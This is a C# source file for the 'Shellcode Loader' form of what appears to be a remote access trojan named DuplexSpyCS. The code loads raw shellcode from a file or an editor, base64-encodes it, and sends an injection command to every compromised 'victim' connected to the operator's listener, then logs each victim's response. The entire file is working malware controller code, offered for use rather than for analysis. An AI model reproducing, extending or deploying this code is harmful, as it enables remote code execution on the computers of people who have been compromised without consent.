using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmShellcodeLoader : Form
    {
        public byte[] m_abShellCode = { };
        private List<clsVictim> m_lsVictim { get; init; }

        public frmShellcodeLoader(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;
            Text = "Shellcode Loader";
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!m_lsVictim.Contains(victim))
                return;

            if (lsMsg[0] == "inject")
            {
                if (lsMsg[1] == "sc")
                {
                    int nProc = int.Parse(lsMsg[2]);
                    if (nProc != -1)
                        return;

                    int nCode = int.Parse(lsMsg[3]);
                    Invoke(new Action(() =>
                    {
                        if (nCode == 0)
                        {
                            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {victim.ID} => {clsCrypto.b64D2Str(lsMsg[4])}");
                            richTextBox1.AppendText(Environment.NewLine);
                        }
                        else
                        {
                            richTextBox1.AppendText($"OK");
                            richTextBox1.AppendText(Environment.NewLine);
                        }
                    }));
                }
            }
        }

        void fnSetup()
        {
            radioButton2.Checked = true;

            foreach (var victim in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(victim.ID);
                item.SubItems.Add("?");

                listView1.Items.Add(item);

                victim.m_listener.ReceivedDecoded += fnRecv;
            }

            listView1.FullRowSelect = true;

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmShellcodeLoader_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Binary File|*.bin|Any File|*.*";

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            frmEditorShellcode f = new frmEditorShellcode(this);
            f.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;

            if (radioButton1.Checked)
            {
                string szFilePath = textBox1.Text;
                if (!File.Exists(szFilePath))
                {
                    MessageBox.Show("File not found: " + szFilePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                Task.Run(() =>
                {
                    byte[] abShellcode = File.ReadAllBytes(szFilePath);
                    string szb64 = Convert.ToBase64String(abShellcode);

                    foreach (var victim in m_lsVictim)
                    {
                        victim.fnSendCommand(new string[]
                        {
                            "inject",
                            "sc",
                            "-1",
                            "-1",
                            szb64,
                        });
                    }
                });
            }
            else if (radioButton2.Checked)
            {
                if (m_abShellCode == null || m_abShellCode.Length == 0)
                {
                    MessageBox.Show("Shellcode is not specified.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                Task.Run(() =>
                {
                    string szb64 = Convert.ToBase64String(m_abShellCode);

                    foreach (var victim in m_lsVictim)
                    {
                        victim.fnSendCommand(new string[]
                        {
                            "inject",
                            "sc",
                            "-1",
                            "-1",
                            szb64,
                        });
                    }
                });
            }
        }

        private void frmShellcodeLoader_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
